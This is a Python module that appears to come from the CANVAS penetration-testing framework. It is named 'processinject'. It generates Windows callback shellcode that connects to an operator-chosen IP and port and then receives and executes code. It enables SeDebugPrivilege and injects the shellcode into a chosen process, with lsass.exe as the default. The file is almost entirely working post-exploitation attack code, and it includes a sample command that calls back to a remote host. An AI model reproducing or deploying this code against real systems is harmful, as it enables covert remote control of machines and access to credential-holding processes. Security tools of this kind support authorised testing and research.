#! /usr/bin/env python



#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from canvasexploit import canvasexploit
import canvasengine
from canvasengine import socket_save_list
import time


NAME="processinject"
DESCRIPTION="Injects a callback shellcode into a process"
DOCUMENTATION={}
DOCUMENTATION["Notes"]="Automatically enables SeDebugPrivilege if needed"
DOCUMENTATION["Commandline Example"]="runmodule processinject -t 1 -l 192.168.1.102 -d 5555 -O name:lsass.exe"

VERSION="1.0"

affectsList=["Commands"]


class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result=""
        self.name=NAME
        self.shellcode=None 
        return
    
    def neededListenerTypes(self):
        caps=self.argsDict["passednodes"][0].capabilities
        if "win32api" in caps:
            return [canvasengine.WIN32MOSDEF]
        else:
            #need to add rest here
            return []
        
    
    def createShellcode(self):
        if not self.callback:
            self.log("No callback needed for this Node type")
        else:
            host=self.callback.ip
            port=self.callback.port
        caps=self.argsDict["passednodes"][0].capabilities
        if "win32api" in caps:
            self.log("Creating shellcode to callback to %s:%s"%(host,port))
            from shellcode import shellcodeGenerator
            sc = shellcodeGenerator.win32()
            #sc.addAttr("ForkLoad", None)
            # the to fork code
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)
            self.shellcode=sc.get()
            self.listenerArgsDict["fromcreatethread"]=1
            return self.shellcode
        else:
            self.log("Not creating shellcode for this node type")
            return ""
        

    def getargs(self):
        self.pidorname=self.argsDict.get("name","lsass.exe")
        self.node=self.argsDict["passednodes"][0]
        return 
        
    def run(self):
        #you'll need to use the -i fromcreatethread option for commandlineInterface.py
        #might want: runmodule getpriv -t 1 -O privname:SeDebugPrivilege
        #example: runmodule processinject -t 1 -l 192.168.1.102 -d 5555 -O name:lsass.exe
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()
        name=self.pidorname
       
        # we may need to hunt down the pid from the name
        pid=self.pidfromname(name,self.node)
        if pid==-1:
            self.log("Was not able to get the pid for %s"%name)
            return 0
        self.log("Injecting into pid %d"%pid)
    
        if "win32api" in self.node.capabilities:
            if not self.shellcode:
                self.log("You forgot to specify a callback for the win32 Node!")
                return 0
            
            self.log("Injecting a shellcode of length %d"%len(self.shellcode))
            self.log("Getting SeDebugPriv if necessary")
            self.exploitnodes("getpriv",[self.node],{"privname":"SeDebugPrivilege"})
            self.log("Injecting into pid")
            ret=self.node.shell.injectintopid(pid,self.shellcode)
        elif "Unixshell" in self.node.capabilities:
            #TODO
            #self.result+=[self.node.runcommand("ps")]
            ret=0
        else:
            self.log("%s node type not supported"%self.node.nodetype)
                
        self.result=ret
        if ret<=0:
            self.log("Injection Failed (%d)"%ret)
            self.setInfo("%s - done (failed: %d)"%(NAME,self.result))
            return 0
        else:
            self.log("Injection succeeded!")
            got_cb=self.ISucceeded() #test for connectback on remote MOSDEF nodes!
        self.setInfo("%s - done (success: %s)"%(NAME,self.result))
        time.sleep(2)
        
        #self.result stores our new PID, potentially...
        if self.result!=0:
            ret=1
        else:
            ret=0
        return ret

